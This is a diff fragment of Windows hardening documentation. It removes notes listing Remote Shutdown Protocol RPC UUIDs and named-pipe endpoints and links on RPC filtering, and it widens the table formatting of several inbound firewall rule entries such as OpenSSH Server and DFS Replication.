-https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd
-
-TODO: Block RDP-related protocols over named pipes?
-
-### \[MS-RSP\]: Remote Shutdown Protocol
-
-https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074
-
-UUID: d95afe70-a6d5-4259-822e-2c84da1ddb0d
-ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
-
-UUID: 76f226c3-ec14-4325-8a99-6a46348418af
-ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
-
-### Further Protocol Considerations
-
-TODO: Firewall remote management?
-
-### Additional Reading on RPC
-
-- [MSRPC-To-ATT&CK](https://github.com/jsecurity101/MSRPC-to-ATTACK)
-- [A Definitive Guide to the Remote Procedure Call (RPC) Filter](https://www.akamai.com/blog/security/guide-rpc-filter#using)
-- [server22_rpc_servers_scrape.csv](https://github.com/akamai/akamai-security-research/blob/main/rpc_toolkit/rpc_interface_lists/server22_rpc_servers_scrape.csv)
-
 ## Inbound Firewall Rules Reference
 
 ### Microsoft's Guidelines
@@ -1903,7 +1940,7 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 #### OpenSSH SSH Server (sshd)
 
 | Property    | Value |
-|-------------|---------------------------------------------------|
+|-------------|----------------------------------------------------------|
 | Name        | OpenSSH-Server-In-TCP |
 | Group       | OpenSSH Server |
 | Direction   | Inbound |
@@ -2104,7 +2141,7 @@ This rule is governed by the [EnableFirewallManagement](#enablefirewallmanagemen
 #### DFS Replication (RPC-In)
 
 | Property    | Value |
-|-------------|---------------------------------------------------|
+|-------------|----------------------------------------------------------|
 | Name        | DFSR-DFSRSvc-In-TCP |
 | Group       | DFS Replication |
 | Direction   | Inbound |
@@ -2118,7 +2155,7 @@ This rule is governed by the [EnableFirewallManagement](#enablefirewallmanagemen
 #### File Replication (RPC)
 
 | Property    | Value |
-|-------------|---------------------------------------------------|
+|-------------|----------------------------------------------------------|
 | Name        | NTFRS-NTFRSSvc-In-TCP |
 | Group       | File Replication |
 | Direction   | Inbound |
